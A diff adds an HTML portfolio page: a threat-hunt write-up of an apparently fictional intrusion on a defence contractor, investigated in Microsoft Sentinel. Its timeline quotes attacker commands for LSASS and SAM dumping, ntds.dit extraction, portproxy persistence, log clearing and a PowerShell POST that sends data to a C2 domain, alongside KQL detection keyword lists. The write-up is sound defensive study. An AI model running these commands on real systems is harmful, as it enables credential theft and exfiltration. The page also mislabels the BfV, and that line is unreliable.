@@ -1,0 +1,1029 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>SILENT CORRIDOR // Joshua Fischer</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&family=JetBrains+Mono:wght@300;400;700&display=swap');
+
+  :root {
+    --black: #000000;
+    --bg: #050505;
+    --bg2: #0a0a0a;
+    --yellow: #FFD700;
+    --yellow-dim: #b89a00;
+    --yellow-faint: #1a1500;
+    --red: #ff3333;
+    --green: #00ff88;
+    --grey: #333333;
+    --text: #cccccc;
+    --text-dim: #666666;
+  }
+
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  html { scroll-behavior: smooth; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 14px;
+    line-height: 1.7;
+    overflow-x: hidden;
+  }
+
+  /* Scanline overlay */
+  body::before {
+    content: '';
+    position: fixed;
+    top: 0; left: 0;
+    width: 100%; height: 100%;
+    background: repeating-linear-gradient(
+      0deg,
+      transparent,
+      transparent 2px,
+      rgba(0,0,0,0.15) 2px,
+      rgba(0,0,0,0.15) 4px
+    );
+    pointer-events: none;
+    z-index: 9999;
+  }
+
+  /* Back link */
+  .back-link {
+    padding: 12px 60px;
+    background: var(--bg2);
+    border-bottom: 1px solid var(--grey);
+    font-family: 'Orbitron', monospace;
+    font-size: 10px;
+    letter-spacing: 2px;
+    position: relative;
+    z-index: 10000;
+  }
+  .back-link a {
+    color: var(--yellow);
+    text-decoration: none;
+  }
+  .back-link a:hover {
+    color: var(--yellow-dim);
+  }
+
+  /* ─── HEADER ─── */
+  header {
+    border-bottom: 1px solid var(--grey);
+    padding: 40px 60px 30px;
+    position: relative;
+    overflow: hidden;
+  }
+
+  header::after {
+    content: '';
+    position: absolute;
+    bottom: 0; left: 0;
+    width: 100%; height: 1px;
+    background: linear-gradient(90deg, transparent, var(--yellow), transparent);
+  }
+
+  .header-top {
+    display: flex;
+    justify-content: space-between;
+    align-items: flex-start;
+    flex-wrap: wrap;
+    gap: 20px;
+  }
+
+  .classification {
+    font-family: 'Orbitron', monospace;
+    font-size: 10px;
+    color: var(--red);
+    letter-spacing: 4px;
+    border: 1px solid var(--red);
+    padding: 4px 12px;
+    display: inline-block;
+    animation: blink 2s infinite;
+  }
+
+  @keyframes blink {
+    0%, 100% { opacity: 1; }
+    50% { opacity: 0.4; }
+  }
+
+  .hunt-meta {
+    text-align: right;
+    font-size: 11px;
+    color: var(--text-dim);
+    letter-spacing: 1px;
+  }
+
+  .hunt-meta span {
+    color: var(--yellow);
+  }
+
+  h1 {
+    font-family: 'Orbitron', monospace;
+    font-size: clamp(28px, 5vw, 52px);
+    font-weight: 900;
+    color: var(--yellow);
+    letter-spacing: 6px;
+    margin: 24px 0 8px;
+    text-shadow: 0 0 40px rgba(255,215,0,0.3);
+  }
+
+  .subtitle {
+    font-size: 12px;
+    color: var(--text-dim);
+    letter-spacing: 3px;
+    text-transform: uppercase;
+  }
+
+  .subtitle span {
+    color: var(--yellow-dim);
+  }
+
+  /* ─── STATS BAR ─── */
+  .stats-bar {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
+    border-bottom: 1px solid var(--grey);
+    border-top: 1px solid var(--grey);
+  }
+
+  .stat {
+    padding: 20px 30px;
+    border-right: 1px solid var(--grey);
+    position: relative;
+  }
+
+  .stat:last-child { border-right: none; }
+
+  .stat-label {
+    font-size: 10px;
+    color: var(--text-dim);
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    margin-bottom: 6px;
+  }
+
+  .stat-value {
+    font-family: 'Orbitron', monospace;
+    font-size: 18px;
+    font-weight: 700;
+    color: var(--yellow);
+  }
+
+  .stat-value.green { color: var(--green); }
+  .stat-value.red { color: var(--red); }
+
+  /* ─── MAIN LAYOUT ─── */
+  .container {
+    max-width: 1100px;
+    margin: 0 auto;
+    padding: 60px 40px;
+  }
+
+  /* ─── SECTION ─── */
+  .section {
+    margin-bottom: 60px;
+    opacity: 0;
+    transform: translateY(20px);
+    animation: fadeUp 0.6s ease forwards;
+  }
+
+  .section:nth-child(1) { animation-delay: 0.1s; }
+  .section:nth-child(2) { animation-delay: 0.2s; }
+  .section:nth-child(3) { animation-delay: 0.3s; }
+  .section:nth-child(4) { animation-delay: 0.4s; }
+  .section:nth-child(5) { animation-delay: 0.5s; }
+  .section:nth-child(6) { animation-delay: 0.6s; }
+  .section:nth-child(7) { animation-delay: 0.7s; }
+
+  @keyframes fadeUp {
+    to { opacity: 1; transform: translateY(0); }
+  }
+
+  .section-header {
+    display: flex;
+    align-items: center;
+    gap: 16px;
+    margin-bottom: 24px;
+  }
+
+  .phase-tag {
+    font-family: 'Orbitron', monospace;
+    font-size: 10px;
+    font-weight: 700;
+    color: var(--black);
+    background: var(--yellow);
+    padding: 4px 10px;
+    letter-spacing: 2px;
+    white-space: nowrap;
+  }
+
+  .section-title {
+    font-family: 'Orbitron', monospace;
+    font-size: 13px;
+    font-weight: 700;
+    color: var(--yellow);
+    letter-spacing: 3px;
+    text-transform: uppercase;
+  }
+
+  .section-line {
+    flex: 1;
+    height: 1px;
+    background: linear-gradient(90deg, var(--grey), transparent);
+  }
+
+  /* ─── PROSE ─── */
+  .prose {
+    color: var(--text);
+    line-height: 1.9;
+    font-size: 13px;
+  }
+
+  .prose p { margin-bottom: 14px; }
+
+  .hl { color: var(--yellow); font-weight: 700; }
+  .hl-red { color: var(--red); }
+  .hl-green { color: var(--green); }
+
+  /* ─── ATTACK CHAIN ─── */
+  .chain {
+    display: flex;
+    flex-direction: column;
+    gap: 0;
+    position: relative;
+  }
+
+  .chain-item {
+    display: grid;
+    grid-template-columns: 160px 1fr;
+    gap: 0;
+    position: relative;
+  }
+
+  .chain-left {
+    padding: 16px 20px 16px 0;
+    border-right: 2px solid var(--yellow);
+    text-align: right;
+    position: relative;
+  }
+
+  .chain-left::after {
+    content: '';
+    position: absolute;
+    right: -6px;
+    top: 50%;
+    transform: translateY(-50%);
+    width: 10px;
+    height: 10px;
+    background: var(--yellow);
+    border-radius: 50%;
+    box-shadow: 0 0 10px var(--yellow);
+  }
+
+  .chain-date {
+    font-size: 10px;
+    color: var(--yellow-dim);
+    letter-spacing: 1px;
+  }
+
+  .chain-phase {
+    font-family: 'Orbitron', monospace;
+    font-size: 9px;
+    color: var(--text-dim);
+    margin-top: 4px;
+    letter-spacing: 1px;
+  }
+
+  .chain-right {
+    padding: 16px 0 16px 24px;
+    border-bottom: 1px solid rgba(255,255,255,0.04);
+  }
+
+  .chain-title {
+    font-family: 'Orbitron', monospace;
+    font-size: 11px;
+    font-weight: 700;
+    color: var(--yellow);
+    letter-spacing: 2px;
+    margin-bottom: 6px;
+  }
+
+  .chain-detail {
+    font-size: 12px;
+    color: var(--text);
+    line-height: 1.6;
+  }
+
+  /* ─── CODE BLOCK ─── */
+  .kql-block {
+    background: var(--bg2);
+    border: 1px solid var(--grey);
+    border-left: 3px solid var(--yellow);
+    padding: 20px 24px;
+    margin: 16px 0;
+    overflow-x: auto;
+    position: relative;
+  }
+
+  .kql-block::before {
+    content: 'KQL';
+    position: absolute;
+    top: 8px;
+    right: 12px;
+    font-size: 9px;
+    color: var(--text-dim);
+    letter-spacing: 2px;
+  }
+
+  .kql-block code {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 12px;
+    color: #aaa;
+    display: block;
+    white-space: pre;
+  }
+
+  .kql-block code .kw { color: #569cd6; }
+  .kql-block code .fn { color: #dcdcaa; }
+  .kql-block code .str { color: #ce9178; }
+  .kql-block code .cm { color: #6a9955; }
+
+  /* ─── INDICATOR TABLE ─── */
+  .ioc-table {
+    width: 100%;
+    border-collapse: collapse;
+    font-size: 12px;
+  }
+
+  .ioc-table th {
+    font-family: 'Orbitron', monospace;
+    font-size: 9px;
+    letter-spacing: 2px;
+    color: var(--text-dim);
+    text-align: left;
+    padding: 10px 16px;
+    border-bottom: 1px solid var(--grey);
+    text-transform: uppercase;
+  }
+
+  .ioc-table td {
+    padding: 10px 16px;
+    border-bottom: 1px solid rgba(255,255,255,0.04);
+    font-family: 'Share Tech Mono', monospace;
+    vertical-align: top;
+  }
+
+  .ioc-table tr:hover td {
+    background: rgba(255,215,0,0.03);
+  }
+
+  .tag {
+    display: inline-block;
+    font-size: 9px;
+    font-family: 'Orbitron', monospace;
+    letter-spacing: 1px;
+    padding: 2px 8px;
+    border-radius: 2px;
+    text-transform: uppercase;
+  }
+
+  .tag-red { background: rgba(255,51,51,0.15); color: var(--red); border: 1px solid rgba(255,51,51,0.3); }
+  .tag-yellow { background: rgba(255,215,0,0.1); color: var(--yellow); border: 1px solid rgba(255,215,0,0.3); }
+  .tag-green { background: rgba(0,255,136,0.1); color: var(--green); border: 1px solid rgba(0,255,136,0.3); }
+
+  /* ─── FINDINGS GRID ─── */
+  .findings-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+    gap: 1px;
+    background: var(--grey);
+    border: 1px solid var(--grey);
+    margin: 20px 0;
+  }
+
+  .finding-card {
+    background: var(--bg);
+    padding: 20px;
+  }
+
+  .finding-card:hover {
+    background: var(--yellow-faint);
+  }
+
+  .finding-icon {
+    font-size: 20px;
+    margin-bottom: 10px;
+  }
+
+  .finding-label {
+    font-family: 'Orbitron', monospace;
+    font-size: 9px;
+    color: var(--text-dim);
+    letter-spacing: 2px;
+    margin-bottom: 6px;
+    text-transform: uppercase;
+  }
+
+  .finding-value {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 13px;
+    color: var(--yellow);
+    word-break: break-all;
+  }
+
+  /* ─── MITRE ─── */
+  .mitre-grid {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 8px;
+    margin: 16px 0;
+  }
+
+  .mitre-tag {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 11px;
+    background: var(--yellow-faint);
+    border: 1px solid var(--yellow-dim);
+    color: var(--yellow);
+    padding: 6px 14px;
+    letter-spacing: 1px;
+  }
+
+  .mitre-tag .tid {
+    color: var(--yellow-dim);
+    font-size: 10px;
+    display: block;
+    margin-bottom: 2px;
+  }
+
+  /* ─── VERDICT BOX ─── */
+  .verdict {
+    border: 1px solid var(--yellow);
+    padding: 30px;
+    margin: 40px 0;
+    position: relative;
+    background: var(--yellow-faint);
+  }
+
+  .verdict::before {
+    content: '// CONCLUSION';
+    position: absolute;
+    top: -8px;
+    left: 20px;
+    background: var(--bg);
+    padding: 0 10px;
+    font-family: 'Orbitron', monospace;
+    font-size: 9px;
+    color: var(--yellow);
+    letter-spacing: 3px;
+  }
+
+  .verdict-title {
+    font-family: 'Orbitron', monospace;
+    font-size: 16px;
+    font-weight: 900;
+    color: var(--yellow);
+    margin-bottom: 12px;
+    letter-spacing: 3px;
+  }
+
+  /* ─── SCORE BOX ─── */
+  .score-box {
+    display: flex;
+    align-items: center;
+    gap: 30px;
+    flex-wrap: wrap;
+    margin-top: 20px;
+  }
+
+  .score-circle {
+    width: 80px;
+    height: 80px;
+    border: 2px solid var(--yellow);
+    border-radius: 50%;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    position: relative;
+  }
+
+  .score-circle::before {
+    content: '';
+    position: absolute;
+    inset: -6px;
+    border-radius: 50%;
+    border: 1px solid rgba(255,215,0,0.2);
+  }
+
+  .score-num {
+    font-family: 'Orbitron', monospace;
+    font-size: 22px;
+    font-weight: 900;
+    color: var(--yellow);
+    line-height: 1;
+  }
+
+  .score-label {
+    font-size: 8px;
+    color: var(--text-dim);
+    letter-spacing: 1px;
+    margin-top: 2px;
+  }
+
+  .score-details {
+    flex: 1;
+  }
+
+  .score-line {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    margin-bottom: 8px;
+  }
+
+  .score-bar-label {
+    font-size: 10px;
+    color: var(--text-dim);
+    width: 80px;
+    letter-spacing: 1px;
+  }
+
+  .score-bar-track {
+    flex: 1;
+    height: 4px;
+    background: var(--grey);
+    position: relative;
+    overflow: hidden;
+  }
+
+  .score-bar-fill {
+    position: absolute;
+    left: 0; top: 0; bottom: 0;
+    background: var(--yellow);
+    animation: barGrow 1s ease forwards;
+    transform-origin: left;
+  }
+
+  @keyframes barGrow {
+    from { width: 0; }
+  }
+
+  /* ─── FOOTER ─── */
+  footer {
+    border-top: 1px solid var(--grey);
+    padding: 30px 60px;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    flex-wrap: wrap;
+    gap: 16px;
+  }
+
+  footer .left {
+    font-size: 11px;
+    color: var(--text-dim);
+    letter-spacing: 1px;
+  }
+
+  footer .left span { color: var(--yellow); }
+
+  footer .right {
+    font-family: 'Orbitron', monospace;
+    font-size: 9px;
+    color: var(--text-dim);
+    letter-spacing: 2px;
+  }
+
+  /* ─── RESPONSIVE ─── */
+  @media (max-width: 700px) {
+    header { padding: 24px 20px; }
+    .container { padding: 40px 20px; }
+    footer { padding: 20px; }
+    .chain-item { grid-template-columns: 100px 1fr; }
+    .stats-bar { grid-template-columns: repeat(2, 1fr); }
+    .back-link { padding: 12px 20px; }
+  }
+</style>
+</head>
+<body>
+
+<div class="back-link">
+  <a href="../index.html">← BACK TO PORTFOLIO</a>
+</div>
+
+<header>
+  <div class="header-top">
+    <div class="classification">⚠ CONFIDENTIAL // THREAT HUNT REPORT</div>
+    <div class="hunt-meta">
+      ANALYST: <span>Joshua Fischer</span><br>
+      PLATFORM: <span>Microsoft Sentinel</span><br>
+      DATE: <span>09 May 2026</span><br>
+      RANK: <span style="color:var(--green)">#2 GLOBAL SOLVE</span>
+    </div>
+  </div>
+  <h1>SILENT CORRIDOR</h1>
+  <div class="subtitle">Proactive Threat Hunt // <span>GREY VEIL</span> // Defence Sector APT // Advanced</div>
+</header>
+
+<div class="stats-bar">
+  <div class="stat">
+    <div class="stat-label">Hunt Type</div>
+    <div class="stat-value" style="font-size:12px">Proactive</div>
+  </div>
+  <div class="stat">
+    <div class="stat-label">Events Analysed</div>
+    <div class="stat-value">8,538</div>
+  </div>
+  <div class="stat">
+    <div class="stat-label">Flags Solved</div>
+    <div class="stat-value green">37 / 37</div>
+  </div>
+  <div class="stat">
+    <div class="stat-label">Global Rank</div>
+    <div class="stat-value green">#2</div>
+  </div>
+  <div class="stat">
+    <div class="stat-label">Dwell Time</div>
+    <div class="stat-value red">13 Days</div>
+  </div>
+  <div class="stat">
+    <div class="stat-label">Hosts Compromised</div>
+    <div class="stat-value red">3</div>
+  </div>
+</div>
+
+<div class="container">
+
+  <!-- SCENARIO -->
+  <div class="section">
+    <div class="section-header">
+      <div class="phase-tag">SCENARIO</div>
+      <div class="section-title">Situation & Scope</div>
+      <div class="section-line"></div>
+    </div>
+    <div class="prose">
+      <p>The <span class="hl">BfV</span> (German Federal Intelligence Service) issued a confidential advisory warning that state-sponsored threat actor <span class="hl">GREY VEIL</span> had been conducting targeted intrusions against European aerospace and defence contractors since late 2025. Their objectives: intellectual property theft and persistent access to engineering networks.</p>
+      <p><span class="hl">Haldric Aerospace</span>, a Tier 2 defence contractor specialising in avionics navigation systems for European military programmes, commissioned a proactive threat hunt. No alerts. No IoCs. Just an advisory and 14 days of telemetry from the engineering segment.</p>
+      <p>GREY VEIL tradecraft is characterised by <span class="hl-red">zero custom tooling</span> — they operate entirely with living-off-the-land techniques. No malware. No signatures. Traditional detection fails completely against this actor.</p>
+    </div>
+  </div>
+
+  <!-- ATTACK CHAIN -->
+  <div class="section">
+    <div class="section-header">
+      <div class="phase-tag">PHASE 01–07</div>
+      <div class="section-title">Full Attack Chain Reconstruction</div>
+      <div class="section-line"></div>
+    </div>
+
+    <div class="chain">
+      <div class="chain-item">
+        <div class="chain-left">
+          <div class="chain-date">Feb 19<br>23:47 UTC</div>
+          <div class="chain-phase">INITIAL ACCESS</div>
+        </div>
+        <div class="chain-right">
+          <div class="chain-title">Credential Testing — Tor Exit Node</div>
+          <div class="chain-detail">IP <span style="color:var(--red)">185.220.101.34</span> (known Tor exit node) attempts <code style="color:var(--yellow)">ssl-login-fail</code> against account <span style="color:var(--yellow)">s.brandt</span> via FortiGate SSL VPN. Credential testing confirmed — same IP returns 13 days later and logs in successfully.</div>
+        </div>
+      </div>
+
+      <div class="chain-item">
+        <div class="chain-left">
+          <div class="chain-date">Feb 20<br>02:14 UTC</div>
+          <div class="chain-phase">INITIAL ACCESS</div>
+        </div>
+        <div class="chain-right">
+          <div class="chain-title">First Successful VPN Entry</div>
+          <div class="chain-detail">185.220.101.34 authenticates successfully. Tunnel established to internal IP <span style="color:var(--yellow)">10.1.96.114</span>, landing on <span style="color:var(--yellow)">WS-ENG04</span>. First recon command fires immediately: <code style="color:var(--yellow)">systeminfo</code> via cmd.exe.</div>
+        </div>
+      </div>
+
+      <div class="chain-item">
+        <div class="chain-left">
+          <div class="chain-date">Feb 23<br>01:47 UTC</div>
+          <div class="chain-phase">DISCOVERY</div>
+        </div>
+        <div class="chain-right">
+          <div class="chain-title">Active Directory Enumeration</div>
+          <div class="chain-detail">AD group enumeration via native net.exe: <code style="color:var(--yellow)">net group "Domain Admins" /dom</code> followed by <code style="color:var(--yellow)">net group "Enterprise Admins" /dom</code>. Security event log immediately cleared with <code style="color:var(--yellow)">wevtutil cl Security</code>.</div>
+        </div>
+      </div>
+
+      <div class="chain-item">
+        <div class="chain-left">
+          <div class="chain-date">Feb 26<br>02:38 UTC</div>
+          <div class="chain-phase">CREDENTIAL ACCESS</div>
+        </div>
+        <div class="chain-right">
+          <div class="chain-title">LSASS Memory Dump + SAM Hive Extraction</div>
+          <div class="chain-detail">Two-pronged credential harvesting: <code style="color:var(--yellow)">tasklist /fi "imagename eq lsass.exe"</code> → <code style="color:var(--yellow)">rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 628 C:\Windows\Temp\sys_diag.dmp full</code>. Additionally: <code style="color:var(--yellow)">reg save HKLM\SAM C:\Windows\Temp\sam.bak</code> and <code style="color:var(--yellow)">cmdkey /list</code> to enumerate stored credentials.</div>
+        </div>
+      </div>
+
+      <div class="chain-item">
+        <div class="chain-left">
+          <div class="chain-date">Feb 28<br>03:15 UTC</div>
+          <div class="chain-phase">LATERAL MOVEMENT</div>
+        </div>
+        <div class="chain-right">
+          <div class="chain-title">Pivot to DC + File Server via WMI</div>
+          <div class="chain-detail">Using harvested credentials for <span style="color:var(--yellow)">m.richter</span> (Haldric2025SecIT — plaintext in command log): <code style="color:var(--yellow)">net use \\SRV-DC01\C$ /user:m.richter</code>. Remote command execution via <code style="color:var(--yellow)">wmic /node:"SRV-DC01" process call create</code>. Pivot also to <span style="color:var(--yellow)">SRV-FILES02</span>.</div>
+        </div>
+      </div>
+
+      <div class="chain-item">
+        <div class="chain-left">
+          <div class="chain-date">Feb 28<br>03:16 UTC</div>
+          <div class="chain-phase">COLLECTION</div>
+        </div>
+        <div class="chain-right">
+          <div class="chain-title">NTDS.DIT Extraction via ntdsutil IFM</div>
+          <div class="chain-detail">On SRV-DC01: <code style="color:var(--yellow)">ntdsutil "ac i ntds" ifm "create full C:\Windows\Temp\McAfee_Logs"</code> — the only method to extract a consistent copy of the AD database while the service is running. Staging folder disguised as McAfee antivirus logs. Files confirmed: ntds.dit + SYSTEM + SECURITY hives.</div>
+        </div>
+      </div>
+
+      <div class="chain-item">
+        <div class="chain-left">
+          <div class="chain-date">Feb 28<br>03:18 UTC</div>
+          <div class="chain-phase">COLLECTION</div>
+        </div>
+        <div class="chain-right">
+          <div class="chain-title">A400M Avionics Data Staged for Exfil</div>
+          <div class="chain-detail">On SRV-FILES02: <code style="color:var(--yellow)">powershell Compress-Archive -Path 'C:\Engineering\Avionics\A400M_NavSys\*' -DestinationPath 'C:\Windows\Temp\win_update_kb5034.zip'</code>. Archive then Base64-encoded: <code style="color:var(--yellow)">certutil -encode win_update_kb5034.zip win_update_kb5034.b64</code>. Disguised as Windows Update KB.</div>
+        </div>
+      </div>
+
+      <div class="chain-item">
+        <div class="chain-left">
+          <div class="chain-date">Feb 28<br>03:25 UTC</div>
+          <div class="chain-phase">PERSISTENCE</div>
+        </div>
+        <div class="chain-right">
+          <div class="chain-title">Port Proxy Tunnel Infrastructure</div>
+          <div class="chain-detail">WS-ENG04: <code style="color:var(--yellow)">netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=8443 connectport=445 connectaddress=SRV-DC01.haldric.local</code>. Stored in registry: <code style="color:var(--yellow)">HKLM\SYSTEM\CurrentControlSet\Services\PortProxy\v4tov4\tcp</code> — survives reboots and credential resets. Matching proxy deployed on SRV-DC01 pointing to 10.1.36.210:8443.</div>
+        </div>
+      </div>
+
+      <div class="chain-item">
+        <div class="chain-left">
+          <div class="chain-date">Mar 02<br>01:19 UTC</div>
+          <div class="chain-phase">EXFILTRATION</div>
+        </div>
+        <div class="chain-right">
+          <div class="chain-title">Data Sent to C2 Infrastructure</div>
+          <div class="chain-detail">From WS-ENG04: <code style="color:var(--yellow)">powershell Invoke-WebRequest -Uri "https://cdn-telemetry.cloud-endpoint.net" -Method POST -InFile "C:\Windows\Temp\win_update_kb5034.b64"</code>. C2 domain disguised as CDN telemetry endpoint. DNS resolved to 172.67.174.46 / 104.21.30.237 (Cloudflare-fronted infrastructure).</div>
+        </div>
+      </div>
+
+      <div class="chain-item">
+        <div class="chain-left">
+          <div class="chain-date">Feb 23 +<br>Feb 28</div>
+          <div class="chain-phase">DEFENCE EVASION</div>
+        </div>
+        <div class="chain-right">
+          <div class="chain-title">Log Clearing Across All Hosts</div>
+          <div class="chain-detail"><code style="color:var(--yellow)">wevtutil cl Security</code> executed on WS-ENG04 (direct, cmd.exe parent), SRV-FILES02 and SRV-DC01 (remote, WmiPrvSE.exe parent). All Windows Security event logs wiped. <span style="color:var(--green)">Missed: Sysmon telemetry</span> — collected to a separate log channel not touched by the clearing commands.</div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- KEY FINDINGS -->
+  <div class="section">
+    <div class="section-header">
+      <div class="phase-tag">IOCs</div>
+      <div class="section-title">Indicators of Compromise</div>
+      <div class="section-line"></div>
+    </div>
+
+    <table class="ioc-table">
+      <tr>
+        <th>Indicator</th>
+        <th>Type</th>
+        <th>Classification</th>
+        <th>Notes</th>
+      </tr>
+      <tr>
+        <td>185.220.101.34</td>
+        <td>IP</td>
+        <td><span class="tag tag-red">Tor Exit Node</span></td>
+        <td>Initial credential test + successful re-entry Mar 05</td>
+      </tr>
+      <tr>
+        <td>45.153.160.88</td>
+        <td>IP</td>
+        <td><span class="tag tag-red">Anonymisation Infra</span></td>
+        <td>Anon infrastructure, attacker sessions 04:20 UTC</td>
+      </tr>
+      <tr>
+        <td>91.234.33.126</td>
+        <td>IP</td>
+        <td><span class="tag tag-red">Anonymisation Infra</span></td>
+        <td>Anon infrastructure, multiple overnight sessions</td>
+      </tr>
+      <tr>
+        <td>cdn-telemetry.cloud-endpoint.net</td>
+        <td>Domain</td>
+        <td><span class="tag tag-red">C2 Exfil</span></td>
+        <td>Cloudflare-fronted, POST exfiltration endpoint</td>
+      </tr>
+      <tr>
+        <td>s.brandt</td>
+        <td>Account</td>
+        <td><span class="tag tag-red">Compromised</span></td>
+        <td>VPN entry point, beachhead on WS-ENG04</td>
+      </tr>
+      <tr>
+        <td>m.richter</td>
+        <td>Account</td>
+        <td><span class="tag tag-red">Compromised</span></td>
+        <td>Credential harvested, used for lateral movement</td>
+      </tr>
+      <tr>
+        <td>C:\Windows\Temp\sys_diag.dmp</td>
+        <td>File</td>
+        <td><span class="tag tag-yellow">Staging</span></td>
+        <td>lsass memory dump via comsvcs.dll MiniDump</td>
+      </tr>
+      <tr>
+        <td>C:\Windows\Temp\win_update_kb5034.zip</td>
+        <td>File</td>
+        <td><span class="tag tag-red">Exfil Package</span></td>
+        <td>A400M_NavSys data, disguised as Windows Update</td>
+      </tr>
+      <tr>
+        <td>C:\Windows\Temp\McAfee_Logs\ntds.dit</td>
+        <td>File</td>
+        <td><span class="tag tag-red">Critical</span></td>
+        <td>Full AD database dump via ntdsutil IFM</td>
+      </tr>
+      <tr>
+        <td>HKLM\SYSTEM\CurrentControlSet\Services\PortProxy</td>
+        <td>Registry</td>
+        <td><span class="tag tag-red">Persistence</span></td>
+        <td>Port proxy survives reboots and credential resets</td>
+      </tr>
+    </table>
+  </div>
+
+  <!-- KQL HIGHLIGHTS -->
+  <div class="section">
+    <div class="section-header">
+      <div class="phase-tag">DETECTION</div>
+      <div class="section-title">Key KQL Queries</div>
+      <div class="section-line"></div>
+    </div>
+
+    <div class="prose"><p>All investigation conducted in Microsoft Sentinel against the unified <span class="hl">SilentCorridorX_CL</span> custom log table. Critical note: <code style="color:var(--yellow)">TimeGenerated</code> reflects ingestion time — always filter on <code style="color:var(--yellow)">EventTime</code> for actual event timestamps.</p></div>
+
+    <div class="kql-block"><code><span class="cm">// Base filter — use at the top of every query</span>
+<span class="kw">let</span> HuntData = SilentCorridorX_CL
+<span class="kw">| where</span> <span class="fn">isnotempty</span>(EventTime)
+<span class="kw">| where</span> TimeGenerated > <span class="fn">datetime</span>(<span class="str">2026-04-07T14:00:00Z</span>);
+
+<span class="cm">// Account profiling — find the outlier</span>
+HuntData
+<span class="kw">| where</span> MdeTable == <span class="str">"FortiGateVPN"</span>
+<span class="kw">| summarize</span>
+    TotalEvents = <span class="fn">count</span>(),
+    UniqueIPs = <span class="fn">dcount</span>(RemoteIP),
+    FirstSeen = <span class="fn">min</span>(EventTime),
+    LastSeen = <span class="fn">max</span>(EventTime)
+  <span class="kw">by</span> AccountName
+<span class="kw">| sort by</span> UniqueIPs <span class="kw">desc</span></code></div>
+
+    <div class="kql-block"><code><span class="cm">// Credential harvesting commands on beachhead</span>
+HuntData
+<span class="kw">| where</span> MdeTable == <span class="str">"DeviceProcessEvents"</span>
+<span class="kw">| where</span> DeviceName == <span class="str">"WS-ENG04"</span>
+<span class="kw">| where</span> ProcessCommandLine <span class="fn">has_any</span> (<span class="str">"lsass"</span>, <span class="str">"comsvcs"</span>, <span class="str">"MiniDump"</span>,
+    <span class="str">"reg save"</span>, <span class="str">"cmdkey"</span>, <span class="str">"ntdsutil"</span>, <span class="str">"portproxy"</span>)
+<span class="kw">| project</span> EventTime, FileName, ProcessCommandLine
+<span class="kw">| sort by</span> EventTime <span class="kw">asc</span></code></div>
+
+    <div class="kql-block"><code><span class="cm">// Detect WMI-based lateral movement from beachhead</span>
+HuntData
+<span class="kw">| where</span> MdeTable == <span class="str">"DeviceProcessEvents"</span>
+<span class="kw">| where</span> FileName == <span class="str">"WMIC.exe"</span>
+<span class="kw">| where</span> ProcessCommandLine <span class="fn">has</span> <span class="str">"process call create"</span>
+<span class="kw">| project</span> EventTime, DeviceName, ProcessCommandLine
+<span class="kw">| sort by</span> EventTime <span class="kw">asc</span></code></div>
+  </div>
+
+  <!-- MITRE -->
+  <div class="section">
+    <div class="section-header">
+      <div class="phase-tag">MITRE</div>
+      <div class="section-title">ATT&CK Mapping</div>
+      <div class="section-line"></div>
+    </div>
+
+    <div class="mitre-grid">
+      <div class="mitre-tag"><span class="tid">T1133</span>External Remote Services</div>
+      <div class="mitre-tag"><span class="tid">T1078</span>Valid Accounts</div>
+      <div class="mitre-tag"><span class="tid">T1003.001</span>LSASS Memory</div>
+      <div class="mitre-tag"><span class="tid">T1003.002</span>SAM Hive</div>
+      <div class="mitre-tag"><span class="tid">T1003.003</span>NTDS.DIT</div>
+      <div class="mitre-tag"><span class="tid">T1087.002</span>Domain Account Discovery</div>
+      <div class="mitre-tag"><span class="tid">T1021.006</span>WinRM / WMI</div>
+      <div class="mitre-tag"><span class="tid">T1047</span>WMI Execution</div>
+      <div class="mitre-tag"><span class="tid">T1560.001</span>Archive via Utility</div>
+      <div class="mitre-tag"><span class="tid">T1132.001</span>Base64 Encoding</div>
+      <div class="mitre-tag"><span class="tid">T1041</span>Exfil Over C2 Channel</div>
+      <div class="mitre-tag"><span class="tid">T1090.001</span>Internal Port Proxy</div>
+      <div class="mitre-tag"><span class="tid">T1070.001</span>Clear Windows Event Logs</div>
+      <div class="mitre-tag"><span class="tid">T1057</span>Process Discovery</div>
+      <div class="mitre-tag"><span class="tid">T1016</span>System Network Discovery</div>
+    </div>
+  </div>
+
+  <!-- VERDICT -->
+  <div class="verdict">
+    <div class="verdict-title">CONFIRMED: GREY VEIL INTRUSION</div>
+    <div class="prose">
+      <p>State-sponsored threat actor GREY VEIL successfully compromised Haldric Aerospace with a <span class="hl">13-day dwell time</span> before detection. All activity was conducted using native Windows tools — no malware, no custom tooling, zero endpoint alerts during the entire intrusion lifecycle.</p>
+      <p>Critical classified material — <span class="hl-red">A400M navigation system engineering data</span> — was successfully exfiltrated to attacker-controlled infrastructure. The full Active Directory credential database (ntds.dit) was also extracted, meaning all domain accounts must be treated as compromised. Port proxy persistence mechanisms survive both reboots and credential resets.</p>
+      <p>The only telemetry that survived the attacker's log-clearing operations was <span class="hl-green">Sysmon</span> — collected to a separate event channel not touched by wevtutil. This was the sole basis for the entire investigation.</p>
+    </div>
+
+    <div class="score-box" style="margin-top:24px">
+      <div class="score-circle">
+        <div class="score-num">37</div>
+        <div class="score-label">FLAGS</div>
+      </div>
+      <div class="score-details">
+        <div class="score-line">
+          <div class="score-bar-label">Completion</div>
+          <div class="score-bar-track"><div class="score-bar-fill" style="width:100%"></div></div>
+          <div style="font-size:11px;color:var(--yellow);width:40px;text-align:right">100%</div>
+        </div>
+        <div class="score-line">
+          <div class="score-bar-label">Global Rank</div>
+          <div class="score-bar-track"><div class="score-bar-fill" style="width:98%;animation-delay:0.2s"></div></div>
